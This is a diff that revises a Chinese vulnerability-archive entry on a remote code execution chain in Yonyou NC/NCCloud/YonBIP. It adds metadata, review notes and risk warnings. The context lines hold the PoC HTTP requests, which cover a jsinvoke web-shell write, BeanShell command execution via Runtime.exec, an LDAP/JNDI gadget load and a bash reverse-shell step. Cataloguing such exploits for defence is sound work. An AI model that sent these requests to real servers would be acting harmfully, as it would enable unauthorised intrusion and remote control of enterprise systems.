@@ -1,10 +1,49 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "用友NC/NCCloud/YonBIP saveXStreamConfig及EL JNDI执行链"
+product: "用友NC/NCCloud/YonBIP"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "NC63/633/65、NCC1903–2111、BIP2207声明"
+prerequisites: "前台；JNDI网络/Java/容器gadget条件"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/CdWxRYHaU2xD03qfFvz-XQ"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B%20NC%20Cloud%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%E5%8F%8D%E5%BC%B9%20shell.md"
+id: "vw-32ecfe1c8284762b99a7addc"
+entity_id: "ve-32ecfe1c8284762b99a7addc"
+schema_version: "1"
 ---
 
-# 用友 NC Cloud 远程代码执行漏洞【反弹 shell】
+# 用友NC/NCCloud/YonBIP saveXStreamConfig及EL JNDI执行链
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友NC/NCCloud/YonBIP；saveXStreamConfig及EL JNDI执行链
+- 版本、配置及部署条件：NC63/633/65、NCC1903–2111、BIP2207声明
+- 认证与权限前提：前台；JNDI网络/Java/容器gadget条件
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 所有HTTP缺头体空行；ladp拼错，Linux bash与Windows初测需分环境
+- NCCloud面向中小企业简介缺依据且与大型平台常见定位冲突待核
+- TomcatEcho/BeanShell两载荷是同文件写入后的变体，不能算两个漏洞
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CdWxRYHaU2xD03qfFvz-XQ)
 
   
@@ -61,7 +100,7 @@ NC63、NC633、NC65、NC Cloud1903、NC Cloud1909、NC Cloud2005、NC Cloud2105�
 
  **Poc（POST）**
 
-```
+```http
 POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
 Host: 127.0.0.1
 Connection: Keep-Alive
@@ -77,13 +116,13 @@ POST 请求，响应存在漏洞
 
        命令执行操作（ipconfig）
 
-```
+```http
 POST /302.jsp?error=bsh.Interpreter HTTP/1.1
 Host: 127.0.0.1
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server
+Cookie: cookiets=1681785470496; JSESSIONID=3*************************************r
 If-None-Match: W/"1571-1589211696000"
 If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
 Content-Type: application/x-www-form-urlencoded
@@ -109,7 +148,7 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 
     使用 ladp 加载利用链 
 
-```
+```http
 POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
 Host: 127.138.100.158:8080
 Connection: Keep-Alive
@@ -127,7 +166,7 @@ vps 开始 ladp 监听
 
 bash 反弹 shell
 
-```
+```http
 GET /301.jsp HTTP/1.1
 Host: 127.0.0.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
